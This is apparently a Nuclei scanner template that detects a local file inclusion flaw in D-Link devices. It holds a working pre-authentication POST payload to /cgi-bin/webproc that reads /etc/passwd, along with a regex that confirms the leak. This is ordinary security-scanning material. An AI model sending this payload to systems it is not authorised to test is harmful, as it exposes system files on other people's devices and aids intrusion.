http:
- body: errorpage=/etc/passwd&obj-action=auth&:action=login
  matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/cgi-bin/webproc'
id: dlink-file-read
info:
  author: dhiyaneshDK
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: D-Link is vulnerable to local file inclusion.
  metadata:
    max-request: 1
  name: D-Link - Local File Inclusion
  reference:
  - https://suid.ch/research/DAP-2020_Preauth_RCE_Chain.html
  severity: high
  tags: dlink,lfi,misconfig,vuln
